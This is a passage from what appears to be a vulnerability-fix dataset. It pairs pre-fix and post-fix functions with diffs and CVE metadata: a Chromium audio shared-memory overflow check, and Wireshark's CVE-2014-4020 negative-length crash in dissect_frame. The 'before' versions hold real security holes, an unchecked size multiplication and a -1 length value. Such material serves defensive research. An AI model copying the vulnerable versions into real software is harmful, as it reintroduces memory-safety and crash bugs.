WebContentsAudioInputStream::Create(\n            device_id,\n            audio_params,\n            audio_manager_->GetWorkerTaskRunner(),\n            audio_mirroring_manager_),\n        entry->writer.get(),\n        user_input_monitor_);\n  } else {\n    // TODO(henrika): replace CreateLowLatency() with Create() as soon\n    // as satish has ensured that Speech Input also uses the default low-\n    // latency path. See crbug.com/112472 for details.\n    entry->controller =\n        media::AudioInputController::CreateLowLatency(audio_manager_,\n                                                      this,\n                                                      audio_params,\n                                                      device_id,\n                                                      entry->writer.get(),\n                                                      user_input_monitor_);\n  }\n\n  if (!entry->controller.get()) {\n    SendErrorMessage(stream_id, STREAM_CREATE_ERROR);\n    return;\n  }\n\n  // Set the initial AGC state for the audio input stream. Note that, the AGC\n  // is only supported in AUDIO_PCM_LOW_LATENCY mode.\n  if (config.params.format() == media::AudioParameters::AUDIO_PCM_LOW_LATENCY)\n    entry->controller->SetAutomaticGainControl(config.automatic_gain_control);\n\n  // Since the controller was created successfully, create an entry and add it\n  // to the map.\n  entry->stream_id = stream_id;\n  audio_entries_.insert(std::make_pair(stream_id, entry.release()));\n\n  MediaStreamManager::SendMessageToNativeLog(\n      \"Audio input stream created successfully.\");\n  audio_log_->OnCreated(stream_id, audio_params, device_id);\n}",
        "func": "void AudioInputRendererHost::OnCreateStream(\n    int stream_id,\n    int render_view_id,\n    int session_id,\n    const AudioInputHostMsg_CreateStream_Config& config) {\n  DCHECK_CURRENTLY_ON(BrowserThread::IO);\n\n  DVLOG(1) << \"AudioInputRendererHost@\" << this\n           << \"::OnCreateStream(stream_id=\" << stream_id\n           << \", render_view_id=\" << render_view_id\n           << \", session_id=\" << session_id << \")\";\n  DCHECK_GT(render_view_id, 0);\n\n  // media::AudioParameters is validated in the deserializer.\n  if (LookupById(stream_id) != NULL) {\n    SendErrorMessage(stream_id, STREAM_ALREADY_EXISTS);\n    return;\n  }\n\n  media::AudioParameters audio_params(config.params);\n  if (media_stream_manager_->audio_input_device_manager()->\n      ShouldUseFakeDevice()) {\n    audio_params.Reset(\n        media::AudioParameters::AUDIO_FAKE,\n        config.params.channel_layout(), config.params.channels(), 0,\n        config.params.sample_rate(), config.params.bits_per_sample(),\n        config.params.frames_per_buffer());\n  }\n\n  // Check if we have the permission to open the device and which device to use.\n  std::string device_id = media::AudioManagerBase::kDefaultDeviceId;\n  if (audio_params.format() != media::AudioParameters::AUDIO_FAKE) {\n    const StreamDeviceInfo* info = media_stream_manager_->\n        audio_input_device_manager()->GetOpenedDeviceInfoById(session_id);\n    if (!info) {\n      SendErrorMessage(stream_id, PERMISSION_DENIED);\n      DLOG(WARNING) << \"No permission has been granted to input stream with \"\n                    << \"session_id=\" << session_id;\n      return;\n    }\n\n    device_id = info->device.id;\n  }\n\n  // Create a new AudioEntry structure.\n  scoped_ptr<AudioEntry> entry(new AudioEntry());\n\n  const uint32 segment_size = (sizeof(media::AudioInputBufferParameters) +\n                               audio_params.GetBytesPerBuffer());\n  entry->shared_memory_segment_count = config.shared_memory_count;\n\n  // Create the shared memory and share it with the renderer process\n  // using a new SyncWriter object.\n  base::CheckedNumeric<uint32> size = segment_size;\n  size *= entry->shared_memory_segment_count;\n  if (!size.IsValid() ||\n      !entry->shared_memory.CreateAndMapAnonymous(size.ValueOrDie())) {\n    // If creation of shared memory failed then send an error message.\n    SendErrorMessage(stream_id, SHARED_MEMORY_CREATE_FAILED);\n    return;\n  }\n\n  scoped_ptr<AudioInputSyncWriter> writer(\n      new AudioInputSyncWriter(&entry->shared_memory,\n                               entry->shared_memory_segment_count));\n\n  if (!writer->Init()) {\n    SendErrorMessage(stream_id, SYNC_WRITER_INIT_FAILED);\n    return;\n  }\n\n  // If we have successfully created the SyncWriter then assign it to the\n  // entry and construct an AudioInputController.\n  entry->writer.reset(writer.release());\n  if (WebContentsCaptureUtil::IsWebContentsDeviceId(device_id)) {\n    entry->controller = media::AudioInputController::CreateForStream(\n        audio_manager_->GetTaskRunner(),\n        this,\n        WebContentsAudioInputStream::Create(\n            device_id,\n            audio_params,\n            audio_manager_->GetWorkerTaskRunner(),\n            audio_mirroring_manager_),\n        entry->writer.get(),\n        user_input_monitor_);\n  } else {\n    // TODO(henrika): replace CreateLowLatency() with Create() as soon\n    // as satish has ensured that Speech Input also uses the default low-\n    // latency path. See crbug.com/112472 for details.\n    entry->controller =\n        media::AudioInputController::CreateLowLatency(audio_manager_,\n                                                      this,\n                                                      audio_params,\n                                                      device_id,\n                                                      entry->writer.get(),\n                                                      user_input_monitor_);\n  }\n\n  if (!entry->controller.get()) {\n    SendErrorMessage(stream_id, STREAM_CREATE_ERROR);\n    return;\n  }\n\n  // Set the initial AGC state for the audio input stream. Note that, the AGC\n  // is only supported in AUDIO_PCM_LOW_LATENCY mode.\n  if (config.params.format() == media::AudioParameters::AUDIO_PCM_LOW_LATENCY)\n    entry->controller->SetAutomaticGainControl(config.automatic_gain_control);\n\n  // Since the controller was created successfully, create an entry and add it\n  // to the map.\n  entry->stream_id = stream_id;\n  audio_entries_.insert(std::make_pair(stream_id, entry.release()));\n\n  MediaStreamManager::SendMessageToNativeLog(\n      \"Audio input stream created successfully.\");\n  audio_log_->OnCreated(stream_id, audio_params, device_id);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -51,8 +51,10 @@\n \n   // Create the shared memory and share it with the renderer process\n   // using a new SyncWriter object.\n-  if (!entry->shared_memory.CreateAndMapAnonymous(\n-      segment_size * entry->shared_memory_segment_count)) {\n+  base::CheckedNumeric<uint32> size = segment_size;\n+  size *= entry->shared_memory_segment_count;\n+  if (!size.IsValid() ||\n+      !entry->shared_memory.CreateAndMapAnonymous(size.ValueOrDie())) {\n     // If creation of shared memory failed then send an error message.\n     SendErrorMessage(stream_id, SHARED_MEMORY_CREATE_FAILED);\n     return;",
        "diff_line_info": {
            "deleted_lines": [
                "  if (!entry->shared_memory.CreateAndMapAnonymous(",
                "      segment_size * entry->shared_memory_segment_count)) {"
            ],
            "added_lines": [
                "  base::CheckedNumeric<uint32> size = segment_size;",
                "  size *= entry->shared_memory_segment_count;",
                "  if (!size.IsValid() ||",
                "      !entry->shared_memory.CreateAndMapAnonymous(size.ValueOrDie())) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-4020",
        "func_name": "wireshark/dissect_frame",
        "description": "The dissect_frame function in epan/dissectors/packet-frame.c in the frame metadissector in Wireshark 1.10.x before 1.10.8 interprets a negative integer as a length value even though it was intended to represent an error condition, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/beb119f911a698d44f4baa06d888bb1e775983bc",
        "commit_title": "Don't use -1 as length in frame dissector.",
        "commit_text": " Additional belated followup to gfe195c0c9 per conversation on -dev about the use of -1 and when we should throw exceptions. See also g867a1827e7.  Should (in theory) permit reverting gfe195c0c9.  Bug:9999 Bug:10030",
        "func_before": "static void\ndissect_frame(tvbuff_t *tvb, packet_info *pinfo, proto_tree *parent_tree)\n{\n\tproto_item  *volatile ti = NULL, *comment_item;\n\tguint\t     cap_len = 0, frame_len = 0;\n\tproto_tree  *volatile tree;\n\tproto_tree  *comments_tree;\n\tproto_item  *item;\n\tconst gchar *cap_plurality, *frame_plurality;\n\n\ttree=parent_tree;\n\n\tpinfo->current_proto = \"Frame\";\n\n\tif (pinfo->pseudo_header != NULL) {\n\t\tswitch (pinfo->fd->lnk_t) {\n\n\t\tcase WTAP_ENCAP_WFLEET_HDLC:\n\t\tcase WTAP_ENCAP_CHDLC_WITH_PHDR:\n\t\tcase WTAP_ENCAP_PPP_WITH_PHDR:\n\t\tcase WTAP_ENCAP_SDLC:\n\t\tcase WTAP_ENCAP_BLUETOOTH_H4_WITH_PHDR:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->p2p.sent ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_BLUETOOTH_HCI:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->bthci.sent;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_LAPB:\n\t\tcase WTAP_ENCAP_FRELAY_WITH_PHDR:\n\t\t\tpinfo->p2p_dir =\n\t\t\t    (pinfo->pseudo_header->x25.flags & FROM_DCE) ?\n\t\t\t    P2P_DIR_RECV : P2P_DIR_SENT;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_ISDN:\n\t\tcase WTAP_ENCAP_V5_EF:\n\t\tcase WTAP_ENCAP_DPNSS:\n\t\tcase WTAP_ENCAP_BACNET_MS_TP_WITH_PHDR:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->isdn.uton ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_LINUX_LAPD:\n\t\t\tpinfo->p2p_dir = (pinfo->pseudo_header->lapd.pkttype == 3 ||\n\t\t\t\tpinfo->pseudo_header->lapd.pkttype == 4) ?\n\t\t\t\tP2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_MTP2_WITH_PHDR:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->mtp2.sent ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tpinfo->link_number  = pinfo->pseudo_header->mtp2.link_number;\n\t\t\tpinfo->annex_a_used = pinfo->pseudo_header->mtp2.annex_a_used;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_GSM_UM:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->gsm_um.uplink ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\t}\n\t}\n\n\tif(pinfo->pkt_comment){\n\t\titem = proto_tree_add_item(tree, proto_pkt_comment, tvb, 0, -1, ENC_NA);\n\t\tcomments_tree = proto_item_add_subtree(item, ett_comments);\n\t\tcomment_item = proto_tree_add_string_format(comments_tree, hf_comments_text, tvb, 0, -1,\n\t\t\t\t\t\t\t                   pinfo->pkt_comment, \"%s\",\n\t\t\t\t\t\t\t                   pinfo->pkt_comment);\n\t\texpert_add_info_format(pinfo, comment_item, &ei_comments_text,\n\t\t\t\t\t                       \"%s\",  pinfo->pkt_comment);\n\n\n\t}\n\n\t/* if FRAME is not referenced from any filters we dont need to worry about\n\t   generating any tree items.  */\n\tif(!proto_field_is_referenced(tree, proto_frame)) {\n\t\ttree=NULL;\n\t\tif(pinfo->fd->flags.has_ts) {\n\t\t\tif(pinfo->fd->abs_ts.nsecs < 0 || pinfo->fd->abs_ts.nsecs >= 1000000000)\n\t\t\t\texpert_add_info(pinfo, NULL, &ei_arrive_time_out_of_range);\n\t\t}\n\t} else {\n\t\tproto_tree *fh_tree;\n\t\tgboolean old_visible;\n\n\t\t/* Put in frame header information. */\n\t\tcap_len = tvb_length(tvb);\n\t\tframe_len = tvb_reported_length(tvb);\n\n\t\tcap_plurality = plurality(cap_len, \"\", \"s\");\n\t\tframe_plurality = plurality(frame_len, \"\", \"s\");\n\n\t\tti = proto_tree_add_protocol_format(tree, proto_frame, tvb, 0, -1,\n\t\t    \"Frame %u: %u byte%s on wire\",\n\t\t    pinfo->fd->num, frame_len, frame_plurality);\n\t\tif (generate_bits_field)\n\t\t\tproto_item_append_text(ti, \" (%u bits)\", frame_len * 8);\n\t\tproto_item_append_text(ti, \", %u byte%s captured\",\n\t\t    cap_len, cap_plurality);\n\t\tif (generate_bits_field) {\n\t\t\tproto_item_append_text(ti, \" (%u bits)\",\n\t\t\t    cap_len * 8);\n\t\t}\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_INTERFACE_ID) {\n\t\t\tproto_item_append_text(ti, \" on interface %u\",\n\t\t\t    pinfo->phdr->interface_id);\n\t\t}\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_PACK_FLAGS) {\n\t\t\tif (pinfo->phdr->pack_flags & 0x00000001) {\n\t\t\t\tproto_item_append_text(ti, \" (inbound)\");\n\t\t\t\tpinfo->p2p_dir = P2P_DIR_RECV;\n\t\t\t}\n\t\t\tif (pinfo->phdr->pack_flags & 0x00000002) {\n\t\t\t\tproto_item_append_text(ti, \" (outbound)\");\n\t\t\t\tpinfo->p2p_dir = P2P_DIR_SENT;\n\t\t\t}\n\t\t}\n\n\t\tfh_tree = proto_item_add_subtree(ti, ett_frame);\n\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_INTERFACE_ID && proto_field_is_referenced(tree, hf_frame_interface_id)) {\n\t\t\tconst char *interface_name = epan_get_interface_name(pinfo->epan, pinfo->phdr->interface_id);\n\n\t\t\tif (interface_name)\n\t\t\t\tproto_tree_add_uint_format_value(fh_tree, hf_frame_interface_id, tvb, 0, 0, pinfo->phdr->interface_id, \"%u (%s)\", pinfo->phdr->interface_id, interface_name);\n\t\t\telse\n\t\t\t\tproto_tree_add_uint(fh_tree, hf_frame_interface_id, tvb, 0, 0, pinfo->phdr->interface_id);\n\t\t}\n\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_PACK_FLAGS) {\n\t\t\tproto_tree *flags_tree;\n\t\t\tproto_item *flags_item;\n\n\t\t\tflags_item = proto_tree_add_uint(fh_tree, hf_frame_pack_flags, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tflags_tree = proto_item_add_subtree(flags_item, ett_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_direction, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_reception_type, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_fcs_length, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_reserved, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_crc_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_wrong_packet_too_long_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_wrong_packet_too_short_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_wrong_inter_frame_gap_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_unaligned_frame_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_start_frame_delimiter_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_preamble_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_symbol_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t}\n\n\t\tproto_tree_add_int(fh_tree, hf_frame_wtap_encap, tvb, 0, 0, pinfo->fd->lnk_t);\n\n\t\tif (pinfo->fd->flags.has_ts) {\n\t\t\tproto_tree_add_time(fh_tree, hf_frame_arrival_time, tvb,\n\t\t\t\t\t    0, 0, &(pinfo->fd->abs_ts));\n\t\t\tif(pinfo->fd->abs_ts.nsecs < 0 || pinfo->fd->abs_ts.nsecs >= 1000000000) {\n\t\t\t\texpert_add_info_format(pinfo, ti, &ei_arrive_time_out_of_range,\n\t\t\t\t\t\t\t\t  \"Arrival Time: Fractional second %09ld is invalid,\"\n\t\t\t\t\t\t\t\t  \" the valid range is 0-1000000000\",\n\t\t\t\t\t\t\t\t  (long) pinfo->fd->abs_ts.nsecs);\n\t\t\t}\n\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_shift_offset, tvb,\n\t\t\t\t\t    0, 0, &(pinfo->fd->shift_offset));\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\n\t\t\tif(generate_epoch_time) {\n\t\t\t\tproto_tree_add_time(fh_tree, hf_frame_arrival_time_epoch, tvb,\n\t\t\t\t\t\t    0, 0, &(pinfo->fd->abs_ts));\n\t\t\t}\n\n\t\t\tif (proto_field_is_referenced(tree, hf_frame_time_delta)) {\n\t\t\t\tnstime_t     del_cap_ts;\n\n\t\t\t\tframe_delta_abs_time(pinfo->epan, pinfo->fd, pinfo->fd->num - 1, &del_cap_ts);\n\n\t\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_time_delta, tvb,\n\t\t\t\t\t\t\t   0, 0, &(del_cap_ts));\n\t\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t\t}\n\n\t\t\tif (proto_field_is_referenced(tree, hf_frame_time_delta_displayed)) {\n\t\t\t\tnstime_t del_dis_ts;\n\n\t\t\t\tframe_delta_abs_time(pinfo->epan, pinfo->fd, pinfo->fd->prev_dis_num, &del_dis_ts);\n\n\t\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_time_delta_displayed, tvb,\n\t\t\t\t\t\t\t   0, 0, &(del_dis_ts));\n\t\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t\t}\n\n\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_time_relative, tvb,\n\t\t\t\t\t\t   0, 0, &(pinfo->rel_ts));\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\n\t\t\tif(pinfo->fd->flags.ref_time){\n\t\t\t\tti = proto_tree_add_item(fh_tree, hf_frame_time_reference, tvb, 0, 0, ENC_NA);\n\t\t\t\tPROTO_ITEM_SET_GENERATED(ti);\n\t\t\t}\n\t\t}\n\n\t\tproto_tree_add_uint(fh_tree, hf_frame_number, tvb,\n\t\t\t\t    0, 0, pinfo->fd->num);\n\n\t\tproto_tree_add_uint_format(fh_tree, hf_frame_len, tvb,\n\t\t\t\t\t   0, 0, frame_len, \"Frame Length: %u byte%s (%u bits)\",\n\t\t\t\t\t   frame_len, frame_plurality, frame_len * 8);\n\n\t\tproto_tree_add_uint_format(fh_tree, hf_frame_capture_len, tvb,\n\t\t\t\t\t   0, 0, cap_len, \"Capture Length: %u byte%s (%u bits)\",\n\t\t\t\t\t   cap_len, cap_plurality, cap_len * 8);\n\n\t\tif (generate_md5_hash) {\n\t\t\tconst guint8 *cp;\n\t\t\tmd5_state_t   md_ctx;\n\t\t\tmd5_byte_t    digest[16];\n\t\t\tconst gchar  *digest_string;\n\n\t\t\tcp = tvb_get_ptr(tvb, 0, cap_len);\n\n\t\t\tmd5_init(&md_ctx);\n\t\t\tmd5_append(&md_ctx, cp, cap_len);\n\t\t\tmd5_finish(&md_ctx, digest);\n\n\t\t\tdigest_string = bytestring_to_str(wmem_packet_scope(), digest, 16, '\\0');\n\t\t\tti = proto_tree_add_string(fh_tree, hf_frame_md5_hash, tvb, 0, 0, digest_string);\n\t\t\tPROTO_ITEM_SET_GENERATED(ti);\n\t\t}\n\n\t\tti = proto_tree_add_boolean(fh_tree, hf_frame_marked, tvb, 0, 0,pinfo->fd->flags.marked);\n\t\tPROTO_ITEM_SET_GENERATED(ti);\n\n\t\tti = proto_tree_add_boolean(fh_tree, hf_frame_ignored, tvb, 0, 0,pinfo->fd->flags.ignored);\n\t\tPROTO_ITEM_SET_GENERATED(ti);\n\n\t\tif(proto_field_is_referenced(tree, hf_frame_protocols)) {\n\t\t\t/* we are going to be using proto_item_append_string() on\n\t\t\t * hf_frame_protocols, and we must therefore disable the\n\t\t\t * TRY_TO_FAKE_THIS_ITEM() optimisation for the tree by\n\t\t\t * setting it as visible.\n\t\t\t *\n\t\t\t * See proto.h for details.\n\t\t\t */\n\t\t\told_visible = proto_tree_set_visible(fh_tree, TRUE);\n\t\t\tti = proto_tree_add_string(fh_tree, hf_frame_protocols, tvb, 0, 0, \"\");\n\t\t\tPROTO_ITEM_SET_GENERATED(ti);\n\t\t\tproto_tree_set_visible(fh_tree, old_visible);\n\t\t}\n\n\t\tif(pinfo->fd->pfd != 0){\n\t\t\tproto_item *ppd_item;\n\t\t\tguint num_entries = g_slist_length(pinfo->fd->pfd);\n\t\t\tguint i;\n\t\t\tppd_item = proto_tree_add_uint(fh_tree, hf_frame_num_p_prot_data, tvb, 0, 0, num_entries);\n\t\t\tPROTO_ITEM_SET_GENERATED(ppd_item);\n\t\t\tfor(i=0; i<num_entries; i++){\n\t\t\t\tproto_tree_add_text (fh_tree, tvb, 0, 0, \"%s\",p_get_proto_name_and_key(wmem_file_scope(), pinfo, i));\n\t\t\t}\n\t\t}\n\t\t/* Check for existences of P2P pseudo header */\n\t\tif (pinfo->p2p_dir != P2P_DIR_UNKNOWN) {\n\t\t\tproto_tree_add_int(fh_tree, hf_frame_p2p_dir, tvb,\n\t\t\t\t\t   0, 0, pinfo->p2p_dir);\n\t\t}\n\n\t\t/* Check for existences of MTP2 link number */\n\t\tif ((pinfo->pseudo_header != NULL ) && (pinfo->fd->lnk_t == WTAP_ENCAP_MTP2_WITH_PHDR)) {\n\t\t\tproto_tree_add_uint(fh_tree, hf_link_number, tvb,\n\t\t\t\t\t    0, 0, pinfo->link_number);\n\t\t}\n\n\t\tif (show_file_off) {\n\t\t\tproto_tree_add_int64_format_value(fh_tree, hf_frame_file_off, tvb,\n\t\t\t\t\t\t    0, 0, pinfo->fd->file_off,\n\t\t\t\t\t\t    \"%\" G_GINT64_MODIFIER \"d (0x%\" G_GINT64_MODIFIER \"x)\",\n\t\t\t\t\t\t    pinfo->fd->file_off, pinfo->fd->file_off);\n\t\t}\n\n\t\tif(pinfo->fd->color_filter != NULL) {\n\t\t\tconst color_filter_t *color_filter = (const color_filter_t *)pinfo->fd->color_filter;\n\t\t\titem = proto_tree_add_string(fh_tree, hf_frame_color_filter_name, tvb,\n\t\t\t\t\t\t     0, 0, color_filter->filter_name);\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t\titem = proto_tree_add_string(fh_tree, hf_frame_color_filter_text, tvb,\n\t\t\t\t\t\t     0, 0, color_filter->filter_text);\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t}\n\t}\n\n\tif (pinfo->fd->flags.ignored) {\n\t\t/* Ignored package, stop handling here */\n\t\tcol_set_str(pinfo->cinfo, COL_INFO, \"<Ignored>\");\n\t\tproto_tree_add_text (tree, tvb, 0, -1, \"This frame is marked as ignored\");\n\t\treturn;\n\t}\n\n\t/* Portable Exception Handling to trap Wireshark specific exceptions like BoundsError exceptions */\n\tTRY {\n#ifdef _MSC_VER\n\t\t/* Win32: Visual-C Structured Exception Handling (SEH) to trap hardware exceptions\n\t\t   like memory access violations.\n\t\t   (a running debugger will be called before the except part below) */\n                /* Note: A Windows \"exceptional exception\" may leave the kazlib's (Portable Exception Handling)\n                   stack in an inconsistent state thus causing a crash at some point in the\n                   handling of the exception.\n                   See: https://www.wireshark.org/lists/wireshark-dev/200704/msg00243.html\n                */\n\t\t__try {\n#endif\n\t\t\tif ((force_docsis_encap) && (docsis_handle)) {\n\t\t\t\tcall_dissector(docsis_handle, tvb, pinfo, parent_tree);\n\t\t\t} else {\n\t\t\t\tif (!dissector_try_uint(wtap_encap_dissector_table, pinfo->fd->lnk_t,\n\t\t\t\t\t\t\ttvb, pinfo, parent_tree)) {\n\n\t\t\t\t\tcol_set_str(pinfo->cinfo, COL_PROTOCOL, \"UNKNOWN\");\n\t\t\t\t\tcol_add_fstr(pinfo->cinfo, COL_INFO, \"WTAP_ENCAP = %d\",\n\t\t\t\t\t\t     pinfo->fd->lnk_t);\n\t\t\t\t\tcall_dissector(data_handle,tvb, pinfo, parent_tree);\n\t\t\t\t}\n\t\t\t}\n#ifdef _MSC_VER\n\t\t} __except(EXCEPTION_EXECUTE_HANDLER /* handle all exceptions */) {\n\t\t\tswitch(GetExceptionCode()) {\n\t\t\tcase(STATUS_ACCESS_VIOLATION):\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       \"STATUS_ACCESS_VIOLATION: dissector accessed an invalid memory address\");\n\t\t\t\tbreak;\n\t\t\tcase(STATUS_INTEGER_DIVIDE_BY_ZERO):\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       \"STATUS_INTEGER_DIVIDE_BY_ZERO: dissector tried an integer division by zero\");\n\t\t\t\tbreak;\n\t\t\tcase(STATUS_STACK_OVERFLOW):\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       \"STATUS_STACK_OVERFLOW: dissector overflowed the stack (e.g. endless loop)\");\n\t\t\t\t/* XXX - this will have probably corrupted the stack,\n\t\t\t\t   which makes problems later in the exception code */\n\t\t\t\tbreak;\n\t\t\t\t/* XXX - add other hardware exception codes as required */\n\t\t\tdefault:\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       g_strdup_printf(\"dissector caused an unknown exception: 0x%x\", GetExceptionCode()));\n\t\t\t}\n\t\t}\n#endif\n\t}",
        "func": "static void\ndissect_frame(tvbuff_t *tvb, packet_info *pinfo, proto_tree *parent_tree)\n{\n\tproto_item  *volatile ti = NULL, *comment_item;\n\tguint\t     cap_len = 0, frame_len = 0;\n\tproto_tree  *volatile tree;\n\tproto_tree  *comments_tree;\n\tproto_item  *item;\n\tconst gchar *cap_plurality, *frame_plurality;\n\n\ttree=parent_tree;\n\n\tpinfo->current_proto = \"Frame\";\n\n\tif (pinfo->pseudo_header != NULL) {\n\t\tswitch (pinfo->fd->lnk_t) {\n\n\t\tcase WTAP_ENCAP_WFLEET_HDLC:\n\t\tcase WTAP_ENCAP_CHDLC_WITH_PHDR:\n\t\tcase WTAP_ENCAP_PPP_WITH_PHDR:\n\t\tcase WTAP_ENCAP_SDLC:\n\t\tcase WTAP_ENCAP_BLUETOOTH_H4_WITH_PHDR:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->p2p.sent ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_BLUETOOTH_HCI:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->bthci.sent;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_LAPB:\n\t\tcase WTAP_ENCAP_FRELAY_WITH_PHDR:\n\t\t\tpinfo->p2p_dir =\n\t\t\t    (pinfo->pseudo_header->x25.flags & FROM_DCE) ?\n\t\t\t    P2P_DIR_RECV : P2P_DIR_SENT;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_ISDN:\n\t\tcase WTAP_ENCAP_V5_EF:\n\t\tcase WTAP_ENCAP_DPNSS:\n\t\tcase WTAP_ENCAP_BACNET_MS_TP_WITH_PHDR:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->isdn.uton ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_LINUX_LAPD:\n\t\t\tpinfo->p2p_dir = (pinfo->pseudo_header->lapd.pkttype == 3 ||\n\t\t\t\tpinfo->pseudo_header->lapd.pkttype == 4) ?\n\t\t\t\tP2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_MTP2_WITH_PHDR:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->mtp2.sent ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tpinfo->link_number  = pinfo->pseudo_header->mtp2.link_number;\n\t\t\tpinfo->annex_a_used = pinfo->pseudo_header->mtp2.annex_a_used;\n\t\t\tbreak;\n\n\t\tcase WTAP_ENCAP_GSM_UM:\n\t\t\tpinfo->p2p_dir = pinfo->pseudo_header->gsm_um.uplink ?\n\t\t\t    P2P_DIR_SENT : P2P_DIR_RECV;\n\t\t\tbreak;\n\n\t\t}\n\t}\n\n\tif(pinfo->pkt_comment){\n\t\titem = proto_tree_add_item(tree, proto_pkt_comment, tvb, 0, 0, ENC_NA);\n\t\tcomments_tree = proto_item_add_subtree(item, ett_comments);\n\t\tcomment_item = proto_tree_add_string_format(comments_tree, hf_comments_text, tvb, 0, 0,\n\t\t\t\t\t\t\t                   pinfo->pkt_comment, \"%s\",\n\t\t\t\t\t\t\t                   pinfo->pkt_comment);\n\t\texpert_add_info_format(pinfo, comment_item, &ei_comments_text,\n\t\t\t\t\t                       \"%s\",  pinfo->pkt_comment);\n\n\n\t}\n\n\t/* if FRAME is not referenced from any filters we dont need to worry about\n\t   generating any tree items.  */\n\tif(!proto_field_is_referenced(tree, proto_frame)) {\n\t\ttree=NULL;\n\t\tif(pinfo->fd->flags.has_ts) {\n\t\t\tif(pinfo->fd->abs_ts.nsecs < 0 || pinfo->fd->abs_ts.nsecs >= 1000000000)\n\t\t\t\texpert_add_info(pinfo, NULL, &ei_arrive_time_out_of_range);\n\t\t}\n\t} else {\n\t\tproto_tree *fh_tree;\n\t\tgboolean old_visible;\n\n\t\t/* Put in frame header information. */\n\t\tcap_len = tvb_length(tvb);\n\t\tframe_len = tvb_reported_length(tvb);\n\n\t\tcap_plurality = plurality(cap_len, \"\", \"s\");\n\t\tframe_plurality = plurality(frame_len, \"\", \"s\");\n\n\t\tti = proto_tree_add_protocol_format(tree, proto_frame, tvb, 0, tvb_captured_length(tvb),\n\t\t    \"Frame %u: %u byte%s on wire\",\n\t\t    pinfo->fd->num, frame_len, frame_plurality);\n\t\tif (generate_bits_field)\n\t\t\tproto_item_append_text(ti, \" (%u bits)\", frame_len * 8);\n\t\tproto_item_append_text(ti, \", %u byte%s captured\",\n\t\t    cap_len, cap_plurality);\n\t\tif (generate_bits_field) 